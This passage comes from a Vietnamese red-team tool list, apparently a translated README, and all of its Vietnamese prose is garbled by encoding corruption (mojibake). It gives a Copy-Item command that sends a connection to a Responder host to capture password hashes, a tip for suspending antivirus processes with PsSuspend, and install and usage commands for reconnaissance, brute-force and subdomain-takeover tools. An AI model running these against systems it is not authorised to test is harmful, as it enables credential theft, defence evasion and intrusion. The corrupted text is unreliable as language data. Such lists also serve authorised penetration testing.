**MÃ´ táº£:** *'Khi thá»±c hiá»‡n ÄÃ¡nh giÃ¡ Rá»§i ro (**Compromise Assessment**), tÃ´i thÆ°á»ng há»i khÃ¡ch hÃ ng liá»‡u tÃ´i cÃ³ thá»ƒ thá»±c hiá»‡n má»™t kiá»ƒm tra nhanh cuá»‘i cÃ¹ng hay khÃ´ng: `Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"`. Náº¿u **Responder** cÃ³ thá»ƒ báº¯t Ä‘Æ°á»£c **hash**, Ä‘iá»u Ä‘Ã³ cÃ³ nghÄ©a lÃ  **firewall** cho phÃ©p káº¿t ná»‘i **SMB** Ä‘i ra'*

**ÄÃ³ng gÃ³p:** [@malmoeb](https://twitter.com/malmoeb)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)

### [ğŸ”™](#tool-list)VÃ´ hiá»‡u hÃ³a AV vá»›i **SysInternals PsSuspend**

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4519f5ad-c177-4550-b9af-238fa73ad66e)

**MÃ´ táº£:** *Sá»­ dá»¥ng **cÃ´ng cá»¥ Microsoft Sysinternals PsSuspend.exe**, cÃ³ thá»ƒ táº¡m dá»«ng má»™t sá»‘ **executable** dá»‹ch vá»¥ AV. **CÃ´ng cá»¥** Ä‘Æ°á»£c kÃ½ bá»Ÿi Microsoft nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c truyá»n **PID** hoáº·c TÃªn cá»§a má»™t dá»‹ch vá»¥ Ä‘ang cháº¡y, nÃ³ sáº½ táº¡m dá»«ng tiáº¿n trÃ¬nh thÃ´ng qua **API Windows NtSuspendProcess**.*

**BÃ i Ä‘Äƒng trÃªn Blog liÃªn quan:** [Bypassing AV via Process Suspension with PsSuspend.exe](https://medium.com/@a-poc/process-suspension-with-pssuspend-exe-0cdf5d16a3b7)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)

**Reconnaissance**
====================

### [ğŸ”™](#tool-list)[**spiderfoot**](https://github.com/smicallef/spiderfoot)

**SpiderFoot** lÃ  má»™t **cÃ´ng cá»¥** tá»± Ä‘á»™ng hÃ³a **Open Source Intelligence (OSINT)**. NÃ³ tÃ­ch há»£p vá»›i háº§u háº¿t má»i nguá»“n dá»¯ liá»‡u cÃ³ sáºµn vÃ  sá»­ dá»¥ng má»™t loáº¡t cÃ¡c phÆ°Æ¡ng phÃ¡p phÃ¢n tÃ­ch dá»¯ liá»‡u, giÃºp dá»¯ liá»‡u dá»… dÃ ng Ä‘iá»u hÆ°á»›ng.

**SpiderFoot** cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng cho má»¥c Ä‘Ã­ch táº¥n cÃ´ng (vÃ­ dá»¥: trong má»™t bÃ i táº­p **red team** hoáº·c kiá»ƒm tra **penetration test**) Ä‘á»ƒ **reconnaissance** má»¥c tiÃªu cá»§a báº¡n hoáº·c phÃ²ng thá»§ Ä‘á»ƒ thu tháº­p thÃ´ng tin vá» nhá»¯ng gÃ¬ báº¡n hoáº·c tá»• chá»©c cá»§a báº¡n cÃ³ thá»ƒ Ä‘Ã£ Ä‘á»ƒ lá»™ trÃªn Internet.

**CÃ i Ä‘áº·t:**

```bash
wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz
tar zxvf v4.0.tar.gz
cd spiderfoot-4.0
pip3 install -r requirements.txt
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux** Ä‘á»ƒ táº£i xuá»‘ng, giáº£i nÃ©n mÃ£ nguá»“n, Ä‘iá»u hÆ°á»›ng vÃ o thÆ° má»¥c vÃ  cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n **Python** yÃªu cáº§u. Äáº£m báº£o há»‡ thá»‘ng cÃ³ **Python 3** vÃ  `pip3`.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://github.com/smicallef/spiderfoot?tab=readme-ov-file#installing--running).

**CÃ¡ch sá»­ dá»¥ng:**

```python
python3 ./sf.py -l 127.0.0.1:5001
```
**LÆ°u Ã½:** Lá»‡nh nÃ y khá»Ÿi Ä‘á»™ng **server web SpiderFoot** trÃªn Ä‘á»‹a chá»‰ loopback (127.0.0.1) vÃ  cá»•ng 5001. Báº¡n sáº½ cáº§n truy cáº­p giao diá»‡n web qua trÃ¬nh duyá»‡t Ä‘á»ƒ sá»­ dá»¥ng **cÃ´ng cá»¥**.

Ráº¥t nhiá»u video hÆ°á»›ng dáº«n sá»­ dá»¥ng [táº¡i Ä‘Ã¢y](https://asciinema.org/~spiderfoot)

![spiderfoot](https://github.com/user-attachments/assets/1ce26a9e-6fa5-4987-9aea-4943b9c2efec)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/smicallef/spiderfoot*

### [ğŸ”™](#tool-list)[**reconftw**](https://github.com/six2dez/reconftw)

**reconFTW** tá»± Ä‘á»™ng hÃ³a toÃ n bá»™ quy trÃ¬nh **reconnaissance** cho báº¡n. NÃ³ vÆ°á»£t trá»™i trong viá»‡c liá»‡t kÃª tÃªn miá»n phá»¥ cÃ¹ng vá»›i nhiá»u kiá»ƒm tra lá»— há»•ng vÃ  thu tháº­p thÃ´ng tin tá»‘i Ä‘a vá» má»¥c tiÃªu cá»§a báº¡n.

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/six2dez/reconftw.git;cd reconftw/;./install.sh
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  lá»‡nh táº£i mÃ£ nguá»“n **reconFTW** vá» (yÃªu cáº§u cÃ i Ä‘áº·t **Git**), chuyá»ƒn vÃ o thÆ° má»¥c cá»§a nÃ³ vÃ  cháº¡y **script cÃ i Ä‘áº·t** (**install.sh**), **script** nÃ y sáº½ lo pháº§n cÃ²n láº¡i (táº£i xuá»‘ng dependency, cáº¥u hÃ¬nh ban Ä‘áº§u, ...). Thá»±c hiá»‡n trÃªn **Linux/macOS**.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://github.com/six2dez/reconftw/wiki/0.-Installation-Guide).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Má»™t má»¥c tiÃªu Ä‘Æ¡n láº»
./reconftw.sh -d target.com -r

# Má»™t má»¥c tiÃªu vá»›i nhiá»u tÃªn miá»n
./reconftw.sh -m target -l domains.txt -r

# Reconnaissance thá»¥ Ä‘á»™ng
./reconftw.sh -d target.com -p

# Thá»±c hiá»‡n táº¥t cáº£ kiá»ƒm tra vÃ  khai thÃ¡c
./reconftw.sh -d target.com -a
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c vÃ­ dá»¥ cÆ¡ báº£n vá» cÃ¡ch cháº¡y **script reconftw.sh** vá»›i cÃ¡c cá» khÃ¡c nhau. `-d` chá»‰ Ä‘á»‹nh tÃªn miá»n má»¥c tiÃªu, `-l` chá»‰ Ä‘á»‹nh danh sÃ¡ch tÃªn miá»n, `-r` cho cháº¿ Ä‘á»™ recon thÃ´ng thÆ°á»ng, `-p` cho recon thá»¥ Ä‘á»™ng, `-a` cho táº¥t cáº£ kiá»ƒm tra/khai thÃ¡c. Cháº¡y trÃªn **Linux/macOS**.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n sá»­ dá»¥ng Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://github.com/six2dez/reconftw/wiki/2.-Usage-Guide).

![reconftw](https://github.com/user-attachments/assets/1a5abeb5-776d-4c10-a02c-934e1662d817)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.youtube.com/watch?v=TQmDAtkD1Wo*

### [ğŸ”™](#tool-list)[**subzy**](https://github.com/PentestPad/subzy)

CÃ´ng cá»¥ chiáº¿m quyá»n Ä‘iá»u khiá»ƒn tÃªn miá»n phá»¥ (**Subdomain takeover tool**) hoáº¡t Ä‘á»™ng dá»±a trÃªn viá»‡c khá»›p dáº¥u vÃ¢n tay pháº£n há»“i tá»« [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md).

**CÃ i Ä‘áº·t:**

```bash
go install -v github.com/PentestPad/subzy@latest
```
**LÆ°u Ã½:** Lá»‡nh nÃ y yÃªu cáº§u **Go** Ä‘Æ°á»£c cÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh Ä‘Ãºng path. NÃ³ táº£i xuá»‘ng vÃ  cÃ i Ä‘áº·t **subzy** vÃ o thÆ° má»¥c bin cá»§a Go workspace.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://github.com/PentestPad/subzy?tab=readme-ov-file#installation).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Danh sÃ¡ch cÃ¡c tÃªn miá»n phá»¥
./subzy run --targets list.txt

# Má»™t hoáº·c nhiá»u má»¥c tiÃªu
./subzy run --target test.google.com
./subzy run --target test.google.com,https://test.yahoo.com
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y cháº¡y tá»‡p nhá»‹ phÃ¢n **subzy** Ä‘Ã£ biÃªn dá»‹ch. `-targets` nháº­n má»™t tá»‡p chá»©a danh sÃ¡ch URL/tÃªn miá»n Ä‘á»ƒ kiá»ƒm tra, `--target` nháº­n má»™t hoáº·c nhiá»u URL/tÃªn miá»n Ä‘Æ°á»£c phÃ¢n tÃ¡ch báº±ng dáº¥u pháº©y.

![subzy](https://github.com/user-attachments/assets/d06bff41-8c0f-4d3d-b42e-1221b9866332)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.geeksforgeeks.org/subzy-subdomain-takeover-vulnerability-checker-tool/*

### [ğŸ”™](#tool-list)[**smtp-user-enum**](https://github.com/cytopia/smtp-user-enum)

Liá»‡t kÃª ngÆ°á»i dÃ¹ng **SMTP** qua VRFY, EXPN vÃ  RCPT vá»›i chá»©c nÄƒng timeout, retry vÃ  reconnect thÃ´ng minh.

**CÃ i Ä‘áº·t:**

```bash
pip install smtp-user-enum
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cÃ i Ä‘áº·t cÃ´ng cá»¥ tá»« **PyPI** báº±ng pip, yÃªu cáº§u cÃ i Ä‘áº·t **Python** vÃ  `pip`.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
smtp-user-enum [options] -u/-U host port
smtp-user-enum --help
smtp-user-enum --version
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y hiá»ƒn thá»‹ cÃ¡ch cháº¡y cÃ´ng cá»¥ `smtp-user-enum` vá»›i cÃ¡c tÃ¹y chá»n, hoáº·c xem trá»£ giÃºp/phiÃªn báº£n. `-u` hoáº·c `-U` thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh tá»‡p chá»©a tÃªn ngÆ°á»i dÃ¹ng hoáº·c tÃªn ngÆ°á»i dÃ¹ng duy nháº¥t Ä‘á»ƒ kiá»ƒm tra sá»± tá»“n táº¡i trÃªn mÃ¡y chá»§ **SMTP** táº¡i `host` vÃ  `port`.

![smtp-user-enum](https://github.com/user-attachments/assets/2a965690-52f3-412a-90e3-54dd69e0b275)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.kali.org/tools/smtp-user-enum/*

### [ğŸ”™](#tool-list)**crt.sh -> httprobe -> EyeWitness**

TÃ´i Ä‘Ã£ ghÃ©p ná»‘i má»™t lá»‡nh bash má»™t dÃ²ng (**one-liner**) thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ sau:
- Thu tháº­p danh sÃ¡ch cÃ¡c tÃªn miá»n phá»¥ má»™t cÃ¡ch thá»¥ Ä‘á»™ng tá»« cÃ¡c liÃªn káº¿t chá»©ng chá»‰ ([crt.sh](https://crt.sh/))
- Chá»§ Ä‘á»™ng gá»­i yÃªu cáº§u tá»›i tá»«ng tÃªn miá»n phá»¥ Ä‘á»ƒ xÃ¡c minh sá»± tá»“n táº¡i cá»§a nÃ³ ([httprobe](https://github.com/tomnomnom/httprobe))
- Chá»§ Ä‘á»™ng chá»¥p áº£nh mÃ n hÃ¬nh tá»«ng tÃªn miá»n phá»¥ Ä‘á»ƒ xem xÃ©t thá»§ cÃ´ng ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))

**CÃ¡ch sá»­ dá»¥ng:**

```bash
domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web
```
**LÆ°u Ã½:** Chuá»—i lá»‡nh bash nÃ y káº¿t há»£p nhiá»u cÃ´ng cá»¥ dÃ²ng lá»‡nh trÃªn **Linux/macOS**.
`curl` táº£i vá» dá»¯ liá»‡u tá»« crt.sh.
`pup` phÃ¢n tÃ­ch HTML vÃ  trÃ­ch xuáº¥t cÃ¡c má»¥c tá»« tháº» `<td>`.
`grep` lá»c káº¿t quáº£ Ä‘á»ƒ chá»‰ láº¥y tÃªn miá»n chá»©a `$domain`.
`sort -n | uniq` sáº¯p xáº¿p vÃ  loáº¡i bá» cÃ¡c báº£n sao.
`httprobe` kiá»ƒm tra xem cÃ¡c tÃªn miá»n cÃ³ hoáº¡t Ä‘á»™ng trÃªn HTTP/S khÃ´ng.
Káº¿t quáº£ Ä‘Æ°á»£c lÆ°u vÃ o má»™t tá»‡p táº¡m thá»i.
Cuá»‘i cÃ¹ng, `python3 ... EyeWitness.py` cháº¡y **EyeWitness** Ä‘á»ƒ chá»¥p áº£nh mÃ n hÃ¬nh cÃ¡c URL trong tá»‡p táº¡m thá»i. YÃªu cáº§u táº¥t cáº£ cÃ¡c cÃ´ng cá»¥ nÃ y pháº£i Ä‘Æ°á»£c cÃ i Ä‘áº·t.

*LÆ°u Ã½: Báº¡n pháº£i cÃ i Ä‘áº·t [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) vÃ  [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) vÃ  thay tháº¿ 'DOMAIN_COM' báº±ng tÃªn miá»n má»¥c tiÃªu. Báº¡n cÃ³ thá»ƒ cháº¡y **script** nÃ y Ä‘á»“ng thá»i trong nhiá»u cá»­a sá»• terminal náº¿u báº¡n cÃ³ nhiá»u tÃªn miá»n gá»‘c má»¥c tiÃªu*

![image](https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png)

![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)

### [ğŸ”™](#tool-list)[**jsendpoints**](https://twitter.com/renniepak/status/1602620834463588352)

Má»™t **bookmarklet JavaScript** Ä‘á»ƒ trÃ­ch xuáº¥t táº¥t cáº£ cÃ¡c liÃªn káº¿t **endpoint** trang web trÃªn má»™t trang.

ÄÆ°á»£c táº¡o bá»Ÿi [@renniepak](https://twitter.com/renniepak), Ä‘oáº¡n mÃ£ **JavaScript** nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ trÃ­ch xuáº¥t táº¥t cáº£ cÃ¡c endpoint (báº¯t Ä‘áº§u báº±ng /) tá»« **DOM** trang web hiá»‡n táº¡i bao gá»“m táº¥t cáº£ cÃ¡c nguá»“n **script** bÃªn ngoÃ i Ä‘Æ°á»£c nhÃºng trÃªn trang web.

```javascript
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```

**CÃ¡ch sá»­ dá»¥ng (**Bookmarklet**)**

Táº¡o má»™t bookmarklet...

- `Nháº¥p chuá»™t pháº£i vÃ o thanh dáº¥u trang cá»§a báº¡n`
- `Nháº¥p vÃ o 'ThÃªm trang'`
- `DÃ¡n mÃ£ JavaScript á»Ÿ trÃªn vÃ o Ã´ 'url'`
- `Nháº¥p vÃ o 'LÆ°u'`

...sau Ä‘Ã³ truy cáº­p trang web má»¥c tiÃªu trong trÃ¬nh duyá»‡t vÃ  nháº¥p vÃ o bookmarklet.

![image](https://user-images.githubusercontent.com/100603074/207563211-6c69711a-f7e7-4451-862b-80c9849df7fe.png)

**CÃ¡ch sá»­ dá»¥ng (Console)**

DÃ¡n mÃ£ JavaScript á»Ÿ trÃªn vÃ o cá»­a sá»• console `F12` vÃ  nháº¥n enter.

![image](https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png)

### [ğŸ”™](#tool-list)[**nuclei**](https://github.com/projectdiscovery/nuclei)

TrÃ¬nh quÃ©t lá»— há»•ng nhanh sá»­ dá»¥ng cÃ¡c máº«u **.yaml** Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c váº¥n Ä‘á» cá»¥ thá»ƒ.

**CÃ i Ä‘áº·t:**

```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```
**LÆ°u Ã½:** Lá»‡nh nÃ y yÃªu cáº§u **Go** Ä‘Æ°á»£c cÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh Ä‘Ãºng path. NÃ³ táº£i xuá»‘ng vÃ  cÃ i Ä‘áº·t **nuclei** vÃ o thÆ° má»¥c bin cá»§a Go workspace.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
cat domains.txt | nuclei -t /PATH/nuclei-templates/
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng `cat` trÃªn **Linux/macOS** Ä‘á»ƒ Ä‘á»c má»™t danh sÃ¡ch tÃªn miá»n tá»« tá»‡p `domains.txt` vÃ  chuyá»ƒn chÃºng lÃ m Ä‘áº§u vÃ o cho **nuclei**. `-t` chá»‰ Ä‘á»‹nh Ä‘Æ°á»ng dáº«n Ä‘áº¿n thÆ° má»¥c chá»©a cÃ¡c tá»‡p máº«u (.yaml) mÃ  **nuclei** sáº½ sá»­ dá»¥ng Ä‘á»ƒ quÃ©t. ÄÃ¢y lÃ  cÃ¡ch phá»• biáº¿n Ä‘á»ƒ quÃ©t nhiá»u má»¥c tiÃªu.

![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)

### [ğŸ”™](#tool-list)[**certSniff**](https://github.com/A-poc/certSniff)

**certSniff** lÃ  má»™t cÃ´ng cá»¥ theo dÃµi tá»« khÃ³a nháº­t kÃ½ **Certificate Transparency** mÃ  tÃ´i Ä‘Ã£ viáº¿t báº±ng **Python**. NÃ³ sá»­ dá»¥ng thÆ° viá»‡n **certstream** Ä‘á»ƒ theo dÃµi nháº­t kÃ½ táº¡o chá»©ng chá»‰ cÃ³ chá»©a cÃ¡c tá»« khÃ³a, Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong má»™t tá»‡p.

Báº¡n cÃ³ thá»ƒ Ä‘áº·t cÃ´ng cá»¥ nÃ y cháº¡y vá»›i má»™t sá»‘ tá»« khÃ³a liÃªn quan Ä‘áº¿n tÃªn miá»n má»¥c tiÃªu cá»§a báº¡n, má»i táº¡o chá»©ng chá»‰ sáº½ Ä‘Æ°á»£c ghi láº¡i vÃ  cÃ³ thá»ƒ dáº«n Ä‘áº¿n viá»‡c khÃ¡m phÃ¡ cÃ¡c tÃªn miá»n mÃ  trÆ°á»›c Ä‘Ã¢y báº¡n khÃ´ng biáº¿t Ä‘áº¿n.

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux/macOS** hoáº·c há»‡ thá»‘ng cÃ³ cÃ i Ä‘áº·t **Git** vÃ  **Python** Ä‘á»ƒ táº£i xuá»‘ng mÃ£ nguá»“n vÃ  cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n Python cáº§n thiáº¿t.

**CÃ¡ch sá»­ dá»¥ng:**

```python
python3 certSniff.py -f example.txt
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y **script Python certSniff.py** vá»›i cá» `-f` Ä‘á»ƒ chá»‰ Ä‘á»‹nh tá»‡p chá»©a danh sÃ¡ch cÃ¡c tá»« khÃ³a cáº§n theo dÃµi trong luá»“ng nháº­t kÃ½ chá»©ng chá»‰ cÃ´ng khai. Cháº¡y trÃªn há»‡ thá»‘ng cÃ³ **Python 3**.

![image](https://user-images.githubusercontent.com/100603074/223851512-068261fa-7070-4307-852c-7ef46d938b18.png)

### [ğŸ”™](#tool-list)[**gobuster**](https://www.kali.org/tools/gobuster/)

CÃ´ng cá»¥ hay Ä‘á»ƒ **brute force** Ä‘Æ°á»ng dáº«n tá»‡p/thÆ° má»¥c trÃªn trang web má»¥c tiÃªu.

**CÃ i Ä‘áº·t:**

```bash
sudo apt install gobuster
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cÃ i Ä‘áº·t **gobuster** trÃªn cÃ¡c báº£n phÃ¢n phá»‘i **Linux** dá»±a trÃªn **Debian/Ubuntu** báº±ng trÃ¬nh quáº£n lÃ½ gÃ³i **apt**. YÃªu cáº§u quyá»n superuser (`sudo`).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y `gobuster` á»Ÿ cháº¿ Ä‘á»™ `dir` (khÃ¡m phÃ¡ thÆ° má»¥c).
`-u` chá»‰ Ä‘á»‹nh URL má»¥c tiÃªu.
`-w` chá»‰ Ä‘á»‹nh **wordlist** Ä‘á»ƒ **brute force**.
`--wildcard` cho phÃ©p xá»­ lÃ½ cÃ¡c pháº£n há»“i khÃ´ng mong muá»‘n.
`-b` chá»‰ Ä‘á»‹nh cÃ¡c mÃ£ tráº¡ng thÃ¡i HTTP Ä‘á»ƒ bá» qua (vÃ­ dá»¥: khÃ´ng pháº£i lá»—i hoáº·c chuyá»ƒn hÆ°á»›ng thÃ nh cÃ´ng).
`-t` Ä‘áº·t sá»‘ lÆ°á»£ng luá»“ng Ä‘á»“ng thá»i.

![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)

### [ğŸ”™](#tool-list)[**feroxbuster**](https://github.com/epi052/feroxbuster)

Má»™t cÃ´ng cá»¥ Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ thá»±c hiá»‡n "**Forced Browsing**", má»™t cuá»™c táº¥n cÃ´ng mÃ  má»¥c Ä‘Ã­ch lÃ  liá»‡t kÃª vÃ  truy cáº­p cÃ¡c tÃ i nguyÃªn khÃ´ng Ä‘Æ°á»£c tham chiáº¿u bá»Ÿi á»©ng dá»¥ng web, nhÆ°ng váº«n cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c bá»Ÿi káº» táº¥n cÃ´ng.

**Feroxbuster** sá»­ dá»¥ng **brute force** káº¿t há»£p vá»›i **wordlist** Ä‘á»ƒ tÃ¬m kiáº¿m ná»™i dung khÃ´ng liÃªn káº¿t trong cÃ¡c thÆ° má»¥c má»¥c tiÃªu. CÃ¡c tÃ i nguyÃªn nÃ y cÃ³ thá»ƒ lÆ°u trá»¯ thÃ´ng tin nháº¡y cáº£m vá» cÃ¡c á»©ng dá»¥ng web vÃ  há»‡ thá»‘ng váº­n hÃ nh, cháº³ng háº¡n nhÆ° mÃ£ nguá»“n, thÃ´ng tin xÃ¡c thá»±c, Ä‘á»‹a chá»‰ máº¡ng ná»™i bá»™, v.v.

**CÃ i Ä‘áº·t: (Kali)**

```bash
sudo apt update && sudo apt install -y feroxbuster
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cáº­p nháº­t vÃ  cÃ i Ä‘áº·t chuáº©n trÃªn **Kali Linux** hoáº·c cÃ¡c há»‡ thá»‘ng dá»±a trÃªn **Debian/Ubuntu** sá»­ dá»¥ng **apt**.

**CÃ i Ä‘áº·t: (Mac)**

```bash
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/master/install-nix.sh | bash
```
**LÆ°u Ã½:** Lá»‡nh nÃ y táº£i xuá»‘ng **script cÃ i Ä‘áº·t** cá»§a **feroxbuster** trá»±c tiáº¿p tá»« **GitHub** vÃ  thá»±c thi nÃ³ báº±ng **bash**. PhÆ°Æ¡ng phÃ¡p cÃ i Ä‘áº·t tiá»‡n lá»£i trÃªn **macOS** hoáº·c **Linux**.

**CÃ i Ä‘áº·t: (**Windows**)**

```bash
Invoke-WebRequest https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-windows-feroxbuster.exe.zip -OutFile feroxbuster.zip
Expand-Archive .\feroxbuster.zip
.\feroxbuster\feroxbuster.exe -V
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh **PowerShell** nÃ y táº£i xuá»‘ng tá»‡p zip cá»§a **feroxbuster** cho **Windows**, giáº£i nÃ©n nÃ³ vÃ  cháº¡y tá»‡p thá»±c thi Ä‘á»ƒ hiá»ƒn thá»‹ phiÃªn báº£n (kiá»ƒm tra cÃ i Ä‘áº·t thÃ nh cÃ´ng). Cháº¡y trÃªn **Windows PowerShell**.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://epi052.github.io/feroxbuster-docs/docs/installation/).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# ThÃªm .pdf, .js, .html, .php, .txt, .json, vÃ  .docx vÃ o má»—i url
./feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx

# QuÃ©t vá»›i header
./feroxbuster -u http://127.1 -H Accept:application/json "Authorization: Bearer {token}"

# Äá»c URL tá»« stdin
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files

# Proxy request thÃ´ng qua burpsuite
./feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080
```

VÃ­ dá»¥ sá»­ dá»¥ng Ä‘áº§y Ä‘á»§ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y [táº¡i Ä‘Ã¢y](https://epi052.github.io/feroxbuster-docs/docs/examples/).

![image](https://user-images.githubusercontent.com/100603074/216729079-7a80f942-a692-4e91-8ffc-7d91d8d69d21.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://raw.githubusercontent.com/epi052/feroxbuster/main/img/demo.gif*

### [ğŸ”™](#tool-list)[**CloudBrute**](https://github.com/0xsha/CloudBrute)

Má»™t cÃ´ng cá»¥ Ä‘á»ƒ tÃ¬m kiáº¿m háº¡ táº§ng, tá»‡p vÃ  á»©ng dá»¥ng cá»§a má»™t cÃ´ng ty (má»¥c tiÃªu) trÃªn cÃ¡c nhÃ  cung cáº¥p **cloud** hÃ ng Ä‘áº§u (**Amazon**, **Google**, **Microsoft**, **DigitalOcean**, **Alibaba**, **Vultr**, **Linode**).

CÃ¡c tÃ­nh nÄƒng:

- PhÃ¡t hiá»‡n **cloud** (**API IPINFO** vÃ  MÃ£ nguá»“n)
- Nhanh (song song)
- Äa ná»n táº£ng (**windows**, **linux**, **mac**)
- Ngáº«u nhiÃªn hÃ³a **User-Agent**
- Ngáº«u nhiÃªn hÃ³a Proxy (**HTTP**, Socks5)

**CÃ i Ä‘áº·t:**

Táº£i xuá»‘ng [phiÃªn báº£n má»›i nháº¥t](https://github.com/0xsha/CloudBrute/releases) cho há»‡ thá»‘ng cá»§a báº¡n vÃ  lÃ m theo hÆ°á»›ng dáº«n sá»­ dá»¥ng.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Má»¥c tiÃªu Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh, táº¡o tá»« khÃ³a dá»±a trÃªn 'target', 80 luá»“ng vá»›i timeout lÃ  10, wordlist 'storage_small.txt'
CloudBrute -d target.com -k target -m storage -t 80 -T 10 -w "./data/storage_small.txt"

# Xuáº¥t káº¿t quáº£ ra file
CloudBrute -d target.com -k keyword -m storage -t 80 -T 10 -w -c amazon -o target_output.txt
```
